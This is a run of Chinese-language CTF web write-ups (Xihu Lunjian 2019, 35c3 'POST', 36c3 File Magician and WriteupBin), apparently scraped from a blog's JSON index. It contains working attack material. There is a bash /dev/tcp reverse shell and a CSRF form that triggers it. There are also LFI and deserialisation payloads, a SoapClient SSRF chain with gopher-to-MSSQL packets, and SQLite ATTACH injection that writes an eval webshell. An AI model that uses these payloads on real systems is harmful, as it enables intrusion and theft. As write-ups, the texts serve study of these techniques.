1command=bash%20-c%20%22sh%20%3E%26%20%2Fdev%2Ftcp%2Fyour_ip%2Fport%200%3E%261%22%20&amp;exec=1 这里我直接弹了 shell ，在根目录下发现 flag.txt 其实如果拿不到 cookie 的话，也可以用以下方式去构造一个 CSRF 12345&lt;form action=\"exec.php\" method=\"post\" id=\"myform\"&gt;&lt;input value=\"bash -c 'sh &gt;&amp; /dev/tcp/your_ip/port 0&gt;&amp;1\\'\" name=\"command\"&gt;&lt;input value=\"1\" name=\"exec\"&gt;&lt;/form&gt;&lt;iframe src=\"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:parent.document.getElementById('myform').submit();\"&gt;&lt;/iframe&gt; 事实证明也确实可以这么去做。 waf 黑名单如下： 12345function waf($str){ $black_list = \"script|\\W+on.*?=\"; $str = preg_replace(\"/\".$black_list.\"/i\",\":)\",$str); return $str;} Web 3 babyt3Descriptionbabyt3(Ubuntu 16.04 php7.0) 题目地址：http://ctf1.linkedbyx.com:10010 Hackingindex 提示了有 dir.php 跟 include $_GET['FILE'] Dir.php 可以列目录，在根目录下找到 flag ，用http://ctf1.linkedbyx.com:10010/?file=/ffffflag_1s_Her4包含即可 真心想吐槽，这么水的题你出在西湖论剑上合适吗？？？还不如月赛 赛后跟师傅们讨论的时候，发现 web3 这种题竟然…能放上来… index.php 源码： 12345678910111213&lt;?php$a = @$_GET['file'];if (!$a) {true$a = './templates/index.html';}echo 'include $_GET[\\'file\\']';if (strpos('flag',$a)!==false) {truedie('nonono');}include $a;?&gt;&lt;!--hint: dir.php --&gt; Dir.php 源码： 123456&lt;?php$a = @$_GET['dir'];if(!$a){$a = '/tmp';}var_dump(scandir($a)); 然后我们就可以看到这个题是多么多么… strpos(‘flag’,$a) !== false strops参数都写反了…所以就成了没有过滤的一道题… 预期解预期解猜测就是使用 php 7 的一个 segmentfault 错误的 bug，也对上了题目描述一开始给出了环境配置的原因 12345678910111213141516171819POST /index.php?file=php://filter/string.strip_tags/resource=/etc/passwd HTTP/1.1Host: localhost:8001User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://localhost/test.phpContent-Type: multipart/form-data; boundary=---------------------------9417939141775834208717807850Content-Length: 248Connection: closeCookie: PHPSESSID=09e1deae1da0a95b2515a0c0a9a07c8bUpgrade-Insecure-Requests: 1-----------------------------9417939141775834208717807850Content-Disposition: form-data; name=\"file\"; filename=\"test.php\"Content-Type: application/octet-stream&lt;?php phpinfo();?&gt;-----------------------------9417939141775834208717807850-- 发以上 http 包，将php://filter/string.strip_tags/resource=/etc/passwd这个 payload 传入include方法会让 php 产生一个 segmentfault ，然后在这段时间内上传的文件将会存储在 php.ini 指定的 upload_tmp_dir 文件夹下，并且不会被删除。 这样我们就可以包含我们的恶意文件代码了。具体看LFI via SegmentFault 自己做了个漏洞环境供复现：PHP7-LFI Web 4 blogDescriptionNULL Hacking原题，Google CTF 2018 bbs github 源码地址: https://github.com/google/google-ctf/tree/master/2018/quals/web-bbs Wp: https://ctftime.org/task/6243 Conclusion这次比赛收获不大，说实在的，还没安恒月赛质量高，而且第三题出的真的是秀了我一脸，让我很怀疑安恒对这次比赛的题目的检验等，也让我对接下来如何去办好一场比赛有一些借鉴经验，希望接下来的 SUCTF 全国赛不会出现这种难以入目的低级错误。","link":"/2019/04/11/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"},{"title":"35c3 POST复盘记录","text":"之前看到了 35c3 的比赛，但是没时间打，看了看题，发现这个题还是不错的，单独拿出来学习一下 [TOC] POSTDescription ​ Go make some posts. Hint: flag is in db Hint2: the lovely XSS is part of the beautiful design and insignificant for the challenge Hint3: You probably want to get the source code, luckily for you it’s rather hard to configure nginx correctly. Attacking Steps这里简述一下攻击链 nginx misconfiguration arbitrary unserialize SoapClient SSRF SoapClient CRLF injection miniProxy URL scheme bypass Connect to MSSQL via gopher Get flag HackingNginx Misconfiguration根据 hint2 ，我们扫目录的时候可以发现 12345678910111213141516[00:42:47] Starting:[00:42:47] 400 - 182B - /%2e%2e/google.com[00:42:52] 301 - 194B - /inc -&gt; http://localhost/inc/[00:42:52] 403 - 580B - /inc/config.inc[00:42:52] 403 - 580B - /inc/[00:42:52] 403 - 580B - /inc/fckeditor[00:42:52] 403 - 580B - /inc/fckeditor/[00:42:52] 403 - 580B - /inc/tiny_mce[00:42:52] 403 - 580B - /inc/tiny_mce/[00:42:52] 403 - 580B - /inc/tinymce/[00:42:52] 403 - 580B - /inc/tinymce[00:42:52] 302 - 0B - /index.php -&gt; /?page=login[00:42:56] 403 - 580B - /uploads[00:42:56] 403 - 580B - /uploads/Task Completed uploads 处发现了两处 403 的地方，而且服务器是 Nginx，而且拿其他一些扫描器也报了目录列举的洞 可以参考Nginx不安全配置可能导致的安全漏洞与三个案例看Nginx配置安全 下载得到源码 Arbitrary Unserialize I我们可以很明显地在 db.php 中发现反序列化的影子 1234567891011121314151617181920212223private static function prepare_params($params) { return array_map(function($x){ if (is_object($x) or is_array($x)) { return '$serializedobject$' . serialize($x); } if (preg_match('/^\\$serializedobject\\$/i', $x)) { die(\"invalid data\"); return \"\"; } return $x; }, $params);}private static function retrieve_values($res) { $result = array(); while ($row = sqlsrv_fetch_array($res)) { $result[] = array_map(function($x){ return preg_match('/^\\$serializedobject\\$/i', $x) ? unserialize(substr($x, 18)) : $x; }, $row); } return $result;} 这里还是比较明显的，但是要怎么构造这个 POP 链呢，我看了一下不是特别明显，也是涉及到了 soapclient 的构造与利用。而且整个构造也需要比较耐心来看，否则会陷入复现都比较懵逼的情况。 首先有反序列化的点，肯定需要有利用的类，否则光有反序列化的点，没有利用的类也没什么用。所以接下来我们需要去找一个可以利用的类。 ByPass Mssql虽然确定了有反序列化漏洞，但是触发反序列化的条件就是 1preg_match('/^\\$serializedobject\\$/i', $x) ? unserialize(substr($x, 18)) : $x; 虽然前面插入数据有给数据增加$serializedobject$的地方，但是这里需要数组或者对象，而我们传入的只能是字符串，所以不能利用这个点。 这里怎么绕过对/^\\$serializedobject\\$/i的正则判断呢？这里就需要用到 Mssql 的一个特性了。 ​ MSSQL converts full-width unicode characters to their ASCII representation. For example, if a string contains 0xEF 0xBC 0x84, it will be stored as $. 也就是说，MSSQL会自动将全角unicode字符转换为ASCII表示形式。例如，如果字符串包含0xEF 0xBC 0x84，则将其存储为$。$s℮rializedobject$ 入库后会变成 $serializedobject$，注意前者的 ℮ 不是 ASCII 的 e，整个字符串的 16 进制如下，可见前者的 ℮ 的 hex 是 E284AE，而后者 e 的 ASCII 是 0x65。 所以我们可以利用这个特性进行绕过，可以用 burp 直接修改十六进制来操作 Soapclient这里我们简单讲一下 soapclient ​ public SoapClient::SoapClient ( mixed $wsdl [, array $options ] ) This constructor creates SoapClient objects in WSDL or non-WSDL mode. 这是一个 php 的内部类，简单来说就是用来创建 soap 数据报文，与 wsdl 接口进行交互的。 其中__call的魔术方法就比较有意思了 ​ SoapClient::__call 1public SoapClient::__call ( string $function_name , array $arguments ) : mixed Calling this method directly is deprecated. Usually, SOAP functions can be called as methods of the SoapClientobject; in situations where this is not possible or additional options are needed, use SoapClient::__soapCall(). 当 SoapClient 建立的时候就会调用这个魔术方法。而且还有一点小特性 ​ 当调用 SoapClient 类的 __call() 魔术方法的时候，会发送一个 POST 请求，请求的参数由着 SoapClient 类的一些参数决定。 __call() 魔术方法：当调用一个类不存在的方法时候会触发这个魔术方法 比如我们以下代码： 1234567&lt;?php$a = new SoapClient(null, array('location' =&gt; \"http://106.14.153.173:2015\",'uri'=&gt; \"123\"));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;hack();?&gt; 当我们直接运行这段代码的时候，就因为调用了一个SoapClient不存在的方法hack()导致直接调用了__call()魔术方法 详细可以参考N1CTF Easy&amp;&amp;Hard Php Writeup ####Arbitrary Unserialize II 好的，我们简单的介绍完了soapclient，接下来我们可以比较明显的看到在 post.php 处有一处类的方法的调用 1234567891011121314151617181920212223class Attachment { private $url = NULL; private $za = NULL; private $mime = NULL; public function __construct($url) { $this-&gt;url = $url; $this-&gt;mime = (new finfo)-&gt;file(\"../\".$url); if (substr($this-&gt;mime, 0, 11) == \"Zip archive\") { $this-&gt;mime = \"Zip archive\"; $this-&gt;za = new ZipArchive; } } public function __toString() { $str = \"&lt;a href='{$this-&gt;url}'&gt;\".basename($this-&gt;url).\"&lt;/a&gt; ($this-&gt;mime \"; if (!is_null($this-&gt;za)) { $this-&gt;za-&gt;open(\"../\".$this-&gt;url); $str .= \"with \".$this-&gt;za-&gt;numFiles . \" Files.\"; } return $str. \")\"; }} 就是在this-&gt;za-&gt;open()处，我们可以充分利用SoapClient的特点进行构造，然而我们需要触发Attachment这个类的__toString()魔术方法，则需要一个echo的地方，然后发现在 default.php 这里有比较好的利用的点 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?php include 'inc/post.php';?&gt;&lt;?php if (isset($_POST[\"title\"])) { $attachments = array(); if (isset($_FILES[\"attach\"]) &amp;&amp; is_array($_FILES[\"attach\"])) { $folder = sha1(random_bytes(10)); mkdir(\"../uploads/$folder\"); for ($i = 0; $i &lt; count($_FILES[\"attach\"][\"tmp_name\"]); $i++) { if ($_FILES[\"attach\"][\"error\"][$i] !== 0) continue; $name = basename($_FILES[\"attach\"][\"name\"][$i]); move_uploaded_file($_FILES[\"attach\"][\"tmp_name\"][$i], \"../uploads/$folder/$name\"); $attachments[] = new Attachment(\"/uploads/$folder/$name\"); } } $post = new Post($_POST[\"title\"], $_POST[\"content\"], $attachments); $post-&gt;save(); } if (isset($_GET[\"action\"])) { if ($_GET[\"action\"] == \"restart\") { Post::truncate(); header(\"Location: /\"); die; } else {?&gt;&lt;?php } } $posts = Post::loadall(); if (empty($posts)) { echo \"&lt;b&gt;You do not have any posts. Create &lt;a href=\\\"/?action=create\\\"&gt;some&lt;/a&gt;!&lt;/b&gt;\"; } else { echo \"&lt;b&gt;You have \" . count($posts) .\" posts. Create &lt;a href=\\\"/?action=create\\\"&gt;some&lt;/a&gt; more if you want! Or &lt;a href=\\\"/?action=restart\\\"&gt;restart your blog&lt;/a&gt;.&lt;/b&gt;\"; } foreach($posts as $p) { echo $p; echo \"&lt;br&gt;&lt;br&gt;\"; } ?&gt; 而且在 post.php 中，class Post还存在一个这个魔术方法，其中把$attach拼接到了字符串当中，所以这里是先调用了Post类的__toString魔术方法，紧接着调用Attachment类的__toString魔术方法，也就可以调用到了$this-&gt;za-&gt;open()的方法。 123456789101112131415161718192021222324252627public function __construct($title, $content, $attachments=\"\") { $this-&gt;title = $title; $this-&gt;content = $content; $this-&gt;attachment = $attachments;}public function save() { global $USER; if (is_null($this-&gt;id)) { DB::insert(\"INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)\", array($USER-&gt;uid, $this-&gt;title, $this-&gt;content, $this-&gt;attachment)); } else { DB::query(\"UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?\", array($this-&gt;title, $this-&gt;content, $this-&gt;attachment, $USER-&gt;uid, $this-&gt;id)); }}public function __toString() { $str = \"&lt;h2&gt;{$this-&gt;title}&lt;/h2&gt;\"; $str .= $this-&gt;content; $str .= \"&lt;hr&gt;Attachments:&lt;br&gt;&lt;il&gt;\"; foreach ($this-&gt;attachment as $attach) { $str .= \"&lt;li&gt;$attach&lt;/li&gt;\"; } $str .= \"&lt;/il&gt;\"; return $str;} 而我们看Post::loadall()，我们可以发现 123456789101112131415161718192021public static function load($id) { global $USER; $res = DB::query(\"SELECT * FROM posts WHERE userid = ? AND id = ?\", array($USER-&gt;uid, $id)); if (!$res) die(\"db error\"); $res = $res[0]; $post = new Post($res[\"title\"], $res[\"content\"], $res[\"attachment\"]); $post-&gt;id = $id; return $post;}public static function loadall() { global $USER; $result = array(); $posts = DB::query(\"SELECT id FROM posts WHERE userid = ? ORDER BY id DESC\", array($USER-&gt;uid)) ; if (!$posts) return $result; foreach ($posts as $p) { $result[] = Post::load($p[\"id\"]); } return $result;} loadall()方法会逐个通过 id 调用load()方法，根据前面的Post构造方法与save()方法，我们可以找到保存attachment的方式。其实这里因为echo输出的是$post['title']、$post['content']，所以我们也可以放在这两者中，都会触发__toString的魔术方法 所以大概的流程就是我们通过构造好一个SoapClient的 payload ，插入之后访问 default.php 触发echo，调用$this-&gt;za-&gt;open()，接着触发SoapClient的__call()魔术函数完成一次反序列化攻击。 因为echo直接调用了反序列化的__toString魔术方法，我们可以直接利用Attachment这个类来构造 payload 12345678910class Attachment { private $za = NULL; public function __construct() { $this-&gt;za = new SoapClient(null,array('location'=&gt;'http://106.14.153.173:2015','uri'=&gt;'123')); }}$c=new Attachment();$aaa=serialize($c);echo $aaa.\"\\n\";echo base64_encode($aaa).\"\\n\"; 利用反序列化的特点，我们可以直接定义私有变量的值，但是字符串中会有不可见字符，实验如下 所以我们需要用base64_encode进行编码，把编码得到的字符串再在 burp 里面进行解码构造请求。 SoapClient SSRF根据 hint1 ，flag 在数据库里，源码中含有数据库信息，因此我们可以利用SoapClient通过 SSRF 打 MSSQL。而题目也给我们提供了 miniProxy.php ，我们可以在 github 上可以看到相关使用说明 ​ miniProxy should be able to run on any web server with PHP 5.4.7 or later. miniProxy requires PHP’s curl and mbstringextensions to be installed. 大概就是一个可以让我们访问内部服务的工具。然后我们根据备份文件 default.backup 得到 123456789101112131415161718server { listen 127.0.0.1:8080; access_log /var/log/nginx/proxy.log; if ( $request_method !~ ^(GET)$ ) { return 405; } root /var/www/miniProxy; location / { index index.php; location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; } } } 当我们请求 8080 的时候，请求的是 miniProxy，但是只能用 GET 请求，而我们之前可以发现SoapClient只能发 POST 请求 这里大概思路也比较清晰了，就是利用 miniProxy 使用 gopher 协议去访问 mssql 数据库拿到 flag ，但是怎么处理让SoapClient发送 GET 请求呢？ ####SoapClient CRLF injection 发送 GET 请求我们就不得不又用到SoapClient的另一个选项 options An array of options. If working in WSDL mode, this parameter is optional. If working in non-WSDL mode, the location and uri options must be set, where location is the URL of the SOAP server to send the request to, and uri is the target namespace of the SOAP service. … The user_agent option specifies string to use in User-Agent header. 而且在 header 里 User-Agent 在 Content-Type 前面，这里我们可以使用 CRLF 进行分隔请求，构造 GET 请求。 miniProxy URL scheme bypass我们自己本地看看 MiniProxy 怎么用。 随便测一个file:///etc/passwd，返回 1Error: Detected a \"file\" URL. miniProxy exclusively supports http[s] URLs. 然后我们定位到代码区 123456789$scheme = parse_url($url, PHP_URL_SCHEME);if (empty($scheme)) { //Assume that any supplied URLs starting with // are HTTP URLs. if (strpos($url, \"//\") === 0) { $url = \"http:\" . $url; }} else if (!preg_match(\"/^https?$/i\", $scheme)) { die('Error: Detected a \"' . $scheme . '\" URL. miniProxy exclusively supports http[s] URLs.');} 发现是这个地方有个正则判断，开头必须以https或者http，然而我们需要用到 gopher 协议，就需要绕过这里。这里也就需要一个小 trick 了 12$scheme = parse_url($url, PHP_URL_SCHEME); // 遇到 gopher:/// 时会解析失败，返回falseempty($scheme) // empty(false) 为 true 这样我们就可以使用gopher:///绕过die的限制执行下面的 $response = makeRequest($url); 请求函数了。 这里也可以使用一个 301 进行跳转。 Connect to MSSQL via gopher怎么构造gopher包呢，这是个比较麻烦的事，之前在另外一个比赛上用 tcpdump 抓自己的 mysql 的数据包然后进行 gopher ，这里也是类似的。这里就不再做了，直接拿官方给的 exp 看看吧。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// the prelogin and login packets can either be assembled// by hand if you are into that kind of stuff.// or you can just use wireshark :)$prelogin_packet = \"\\x12\\x01\\x00\\x2f\\x00\\x00\\x01\\x00\";$prelogin_packet .= \"\\x00\\x00\\x1a\\x00\\x06\\x01\\x00\\x20\";$prelogin_packet .= \"\\x00\\x01\\x02\\x00\\x21\\x00\\x01\\x03\";$prelogin_packet .= \"\\x00\\x22\\x00\\x04\\x04\\x00\\x26\\x00\";$prelogin_packet .= \"\\x01\\xff\\x00\\x00\\x00\\x01\\x00\\x01\";$prelogin_packet .= \"\\x02\\x00\\x00\\x00\\x00\\x00\\x00\";$login_packet = \"\\x10\\x01\\x00\\xde\\x00\\x00\\x01\\x00\";$login_packet .= \"\\xd6\\x00\\x00\\x00\\x04\\x00\\x00\\x74\";$login_packet .= \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\";$login_packet .= \"\\x54\\x30\\x00\\x00\\x00\\x00\\x00\\x00\";$login_packet .= \"\\xe0\\x00\\x00\\x08\\xc4\\xff\\xff\\xff\";$login_packet .= \"\\x09\\x04\\x00\\x00\\x5e\\x00\\x07\\x00\";$login_packet .= \"\\x6c\\x00\\x0a\\x00\\x80\\x00\\x08\\x00\";$login_packet .= \"\\x90\\x00\\x0a\\x00\\xa4\\x00\\x09\\x00\";$login_packet .= \"\\xb6\\x00\\x00\\x00\\xb6\\x00\\x07\\x00\";$login_packet .= \"\\xc4\\x00\\x00\\x00\\xc4\\x00\\x09\\x00\";$login_packet .= \"\\x01\\x02\\x03\\x04\\x05\\x06\\xd6\\x00\";$login_packet .= \"\\x00\\x00\\xd6\\x00\\x00\\x00\\xd6\\x00\";$login_packet .= \"\\x00\\x00\\x00\\x00\\x00\\x00\\x61\\x00\";$login_packet .= \"\\x77\\x00\\x65\\x00\\x73\\x00\\x6f\\x00\";$login_packet .= \"\\x6d\\x00\\x65\\x00\\x63\\x00\\x68\\x00\";$login_packet .= \"\\x61\\x00\\x6c\\x00\\x6c\\x00\\x65\\x00\";$login_packet .= \"\\x6e\\x00\\x67\\x00\\x65\\x00\\x72\\x00\";$login_packet .= \"\\xc1\\xa5\\x53\\xa5\\x53\\xa5\\x83\\xa5\";$login_packet .= \"\\xb3\\xa5\\x82\\xa5\\xb6\\xa5\\xb7\\xa5\";$login_packet .= \"\\x6e\\x00\\x6f\\x00\\x64\\x00\\x65\\x00\";$login_packet .= \"\\x2d\\x00\\x6d\\x00\\x73\\x00\\x73\\x00\";$login_packet .= \"\\x71\\x00\\x6c\\x00\\x6c\\x00\\x6f\\x00\";$login_packet .= \"\\x63\\x00\\x61\\x00\\x6c\\x00\\x68\\x00\";$login_packet .= \"\\x6f\\x00\\x73\\x00\\x74\\x00\\x54\\x00\";$login_packet .= \"\\x65\\x00\\x64\\x00\\x69\\x00\\x6f\\x00\";$login_packet .= \"\\x75\\x00\\x73\\x00\\x63\\x00\\x68\\x00\";$login_packet .= \"\\x61\\x00\\x6c\\x00\\x6c\\x00\\x65\\x00\";$login_packet .= \"\\x6e\\x00\\x67\\x00\\x65\\x00\";// need to add a ;-- - to execute the query successfully,// because gopher adds a \\x0d\\x0a to the end of the request// and for some reaason the query does not execute if we don't// comment that out$query = $argv[1] . \";-- -\";$query = mb_convert_encoding($query, \"utf-16le\");// the length of the packet is the length of the query +// the length of the header (30 bytes) + the \\x0d\\x0a added// by gopher protocol$length = strlen($query) + 30 + 2;$query_packet = \"\\x01\\x01\" . pack(\"n\", $length) . \"\\x00\\x00\\x01\\x00\";$query_packet .= \"\\x16\\x00\\x00\\x00\\x12\\x00\\x00\\x00\";$query_packet .= \"\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\";$query_packet .= \"\\x00\\x00\\x01\\x00\\x00\\x00\";$query_packet .= $query;$payload = $prelogin_packet . $login_packet . $query_packet; 可以看到这里需要加入一个;-- -，是为了注释掉\\x0a\\x0a，这是 gopher 自动添加的内容，不然 query 无法成功执行。 Get Flag基本的利用点都分析完了，最后这道题还比较良心地在 bootstrap.php 中设置了 1if (isset($_SERVER[\"HTTP_DEBUG\"])) var_dump($USER); 可以看到自己的 UID 这个可以用来干嘛呢？当然是用来注入了啦，直接在自己的 post 中获取相关的信息 1insert into posts (userid, title, content, attachment) values ({}, \"foobar\", (select flag from flag.flag), \"foobar\"); Conclusion整个复现完还是感觉比较有难度的，特别是整个构造链都比较有意思。通过SoapClient反序列化到 gopher SSRF 到 CRLF 再到 Get Flag，整个流程需要的技巧以及对自己的能力要求比较高，整体下来学习了不少。主要都是与SoapClient相关，还是比较 Nice 的题目，也重新认识了反序列化漏洞。整体都比较赞。 php — BonusDescription ​ PHP’s unserialization mechanism can be exceptional. 给个 bonus 吧，也算是一道简单的序列化题目 1234567891011121314&lt;?php$line = trim(fgets(STDIN));$flag = file_get_contents('/flag');class B { function __destruct() { global $flag; echo $flag; }}$a = @unserialize($line);throw new Exception('Well that was unexpected…');echo $a;?&gt; HackingPhp 正常的类调用析构函数一般会在脚本结束的时候，然而这里要想拿到 flag ，就需要调用析构函数。然而unserialize正常解析类的时候不会调用析构函数，但是当解析出错的时候，如果类名是正确的，就会调用这个类的析构函数，比如正常序列化出来的类是这样的O:1:\"B\":0:{}，只要我们让他解析出错就可以调用析构函数了，所以以下随便用一个就好了 12O:1:\"B\":0:{O:1:\"B\":1:{}","link":"/2019/03/23/35c3-POST%E5%A4%8D%E7%9B%98%E8%AE%B0%E5%BD%95/"},{"title":"36c3 Web 学习记录","text":"签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。 文章首发于先知社区：https://xz.aliyun.com/t/7081 如果师傅们有更好更有意思的解法，欢迎多多与菜鸡交流。非常感谢 @rebirth @wonderkun @wupco 等师傅在我学习本次比赛赛题时候不厌其烦地指导我。 File Magician Difficulty estimate: easy Solved:133/321 Points: round(1000 · min(1, 10 / (9 + [133 solves]))) = 70 points Description: Finally (again), a minimalistic, open-source file hosting solution. Download: file magician-3ace41f3b0282a70.tar.xz (2.1 KiB) 算是 Web 当中的一个签到题，直接给出 Docker 文件源代码，我们可以在本地搭起来试试。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);ini_set('display_errors', 0);ini_set('display_startup_errors', 0);session_start();if( ! isset($_SESSION['id'])) { $_SESSION['id'] = bin2hex(random_bytes(32));}$d = '/var/www/html/files/'.$_SESSION['id'] . '/';@mkdir($d, 0700, TRUE);chdir($d) || die('chdir');$db = new PDO('sqlite:' . $d . 'db.sqlite3');$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);$db-&gt;exec('CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);');if (isset($_FILES['file']) &amp;&amp; $_FILES['file']['size'] &lt; 10*1024 ){ $s = \"INSERT INTO upload(info) VALUES ('\" .(new finfo)-&gt;file($_FILES['file']['tmp_name']). \" ');\"; $db-&gt;exec($s); move_uploaded_file( $_FILES['file']['tmp_name'], $d . $db-&gt;lastInsertId()) || die('move_upload_file');}$uploads = [];$sql = 'SELECT * FROM upload';foreach ($db-&gt;query($sql) as $row) { $uploads[] = [$row['id'], $row['info']];}?&gt;&lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;file magician&lt;/title&gt;&lt;/head&gt;&lt;form enctype=\"multipart/form-data\" method=\"post\"&gt; &lt;input type=\"file\" name=\"file\"&gt; &lt;input type=\"submit\" value=\"upload\"&gt;&lt;/form&gt;&lt;table&gt; &lt;?php foreach($uploads as $upload):?&gt; &lt;tr&gt; &lt;td&gt;&lt;a href=\"&lt;?= '/files/' . $_SESSION['id'] . '/' . $upload[0] ?&gt;\"&gt;&lt;?= $upload[0] ?&gt;&lt;/a&gt;&lt;/td&gt; &lt;td&gt;&lt;?= $upload[1] ?&gt;&lt;/td&gt; &lt;/tr&gt; &lt;?php endforeach?&gt;&lt;/table&gt; 题目功能点就是一个简单的文件上传，然后在自己的 sandbox 当中看到自己的文件类型，文件类型是由(new finfo)-&gt;file来判断的，还使用了 sqlite 进行存储文件上传的记录。 由于创建的数据库规定了 id 为自增长的整型主键，而且它使用了lastInsertId()返回最后一次 insert 数据的 id 作为文件名 1move_uploaded_file( $_FILES['file']['tmp_name'], $d . $db-&gt;lastInsertId()) || die('move_upload_file'); 所以我们基本上可以不用考虑是否存在通过可控文件名上传文件 Getshell 的操作了。 纵观整个文件，其实我们可以发现，我们可控制的输入点也只有在文件类型当中，文件类型又被拼入到了 sql 语句当中 1$s = \"INSERT INTO upload(info) VALUES ('\" .(new finfo)-&gt;file($_FILES['file']['tmp_name']). \" ');\"; 所以比较明显，我们只能通过这个来进行 sql 注入来进行一些操作了。 我的思路就是 fuzz 一些特殊的文件，可能存在某些文件使用finfo得出来的结果含有单引号什么的，并且我们还能够插入可控数据，于是我就开始 fuzz 文件头，从0x00到0xff0xff。 终于在0x1f0x9d得到一个文件类型是compress'd data，虽然有单引号，但是不存在我们可控的数据。 还有一个是0xfb0x01得到一个文件类型是QDOS object ''，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下 发现这里被吃掉了一个p，于是我们调整一下 payload 就可以用来注入了。 sqlite 是可以用 .php 文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过 sqlite attach 一个 z.php 的方法来写 shell 了。 1ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/* 1ATTACH DATABASE 'z.php' AS t;insert INTO t.e (d) VALUES ('&lt;?php eval($_POST[a])?&gt;');/* 这里可能需要注意的就是有长度限制，所以我们需要分两次来写 shell other file看其他选手的公开的 wp 也是很有趣的一件事，然后从 ctftime 上公开的 wp，我们可以发现还存在着这么一些文件可以用来注入。 TeX DVI file0xf702 文件头，在填充一定数据后有我们完全可控的数据 jpeg在 jpeg 的 EXIF 数据段中有用来标识 software 的数据也是我们可控的地方，同样用来标识 comment 的地方我们也可控。于是我们可以使用 exiftool 来修改图片。 1exiftool -overwrite_original -comment=\"payload\" -software=\"payload2\" 1.jpg #!我们还可以利用#!/的文件来构造 payload gz利用gunzip生成的 gz 文件，我们也可以用来注入，我们可控的数据是它的文件名 当然我们也可以直接修改 gz 文件内容 WriteUpBin Difficulty estimate: medium Solved:13/321 Points: round(1000 · min(1, 10 / (9 + [13 solves]))) = 455 points Description: Finally (again), a minimalistic, open-source social writeup hosting solution. Download: WriteupBin-10b65573b511269f.tar.xz 一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag 存放在数据库当中，并且是在 admin 用户的第一条 writeup 数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给 admin ，让 admin 给你点赞。 项目结构如下： 123456789101112131415161718192021.├── Dockerfile //Docker文件├── admin.py //使用selenium模拟admin登录并点赞├── db.sql //数据库文件├── docker-stuff│&nbsp;&nbsp; ├── default //配置文件│&nbsp;&nbsp; └── www.conf //配置文件├── www│&nbsp;&nbsp; ├── general.php //连接数据库设置header头等一些初始化操作│&nbsp;&nbsp; ├── html│&nbsp;&nbsp; │&nbsp;&nbsp; ├── add.php //添加writeup相关操作│&nbsp;&nbsp; │&nbsp;&nbsp; ├── admin.php //把writeup提交给admin│&nbsp;&nbsp; │&nbsp;&nbsp; ├── index.php //入口文件│&nbsp;&nbsp; │&nbsp;&nbsp; ├── like.php //点赞操作│&nbsp;&nbsp; │&nbsp;&nbsp; ├── login_admin.php //admin登陆操作│&nbsp;&nbsp; │&nbsp;&nbsp; └── show.php //获取writeup内容│&nbsp;&nbsp; └── views│&nbsp;&nbsp; ├── header.php //在页面上方展示目前id提交的writeup│&nbsp;&nbsp; ├── home.php //页面中部用来提供给用户输入的界面│&nbsp;&nbsp; └── show.php //点赞、提交给admin的展示页面└── ynetd //用来启动 admin.py 既然 flag 在数据库当中，那我们可以首先来看看 show.php ，因为这个文件可以直接用来获取 writeup 的内容。 1234567891011121314151617&lt;?phpinclude_once '../general.php';$stmt = $db-&gt;prepare('SELECT id, content FROM `writeup` WHERE `id` = ?');$stmt-&gt;bind_param('s', $_GET['id']);$stmt-&gt;execute();$writeup = mysqli_fetch_all($stmt-&gt;get_result(), MYSQLI_ASSOC)[0];$stmt = $db-&gt;prepare('SELECT user_id FROM `like` WHERE `writeup_id` = ?');$stmt-&gt;bind_param('s', $_GET['id']);$stmt-&gt;execute();$result = $stmt-&gt;get_result();$likes = mysqli_fetch_all($result, MYSQLI_ASSOC);include('../views/header.php');include('../views/show.php'); 我们可以看到 id 并没有什么鉴权措施，也就是说，我们可以通过 writeup id 来获取 writeup 内容，而 flag writeup id 在 admin 用户数据当中，而在 header.php 中可以看到当前用户所有的 writeup id 123&lt;?php foreach($writeups as $w): ?&gt; &lt;li&gt;&lt;a href=\"/show.php?id=&lt;?= $w['id'] ?&gt;\"&gt;Writeup - &lt;?= $w['id'] ?&gt;&lt;/a&gt;&lt;/li&gt;&lt;?php endforeach; ?&gt; 既然有提交代码给 admin 的功能，那么是不是有可能是一个 xss 或者什么的？ 我们还可以看到 admin 再收到 writeup 后的主要操作： 123456789101112131415display = Display(visible=0, size=(800, 600))display.start()chrome_options = Options()chrome_options.add_argument('--disable-gpu')chrome_options.add_argument('--headless')chrome_options.add_argument('--no-sandbox')driver = webdriver.Chrome('/usr/bin/chromedriver', options=chrome_options)url = 'http://admin:__ADMIN_TOKEN__@127.0.0.1/login_admin.php?id='+writeup_iddriver.get(url)element = driver.find_element_by_xpath('//input[@id=\"like\"]')element.click()driver.quit()display.stop() 我们可以看到 admin 在进行登录之后使用find_element_by_xpath找到了 id 为 like 的 input 标签，并进行了点击，也就是提交给 admin 的 writeup 后，admin 会浏览进行点击，发送一个点赞请求 12345&lt;form method=\"post\" 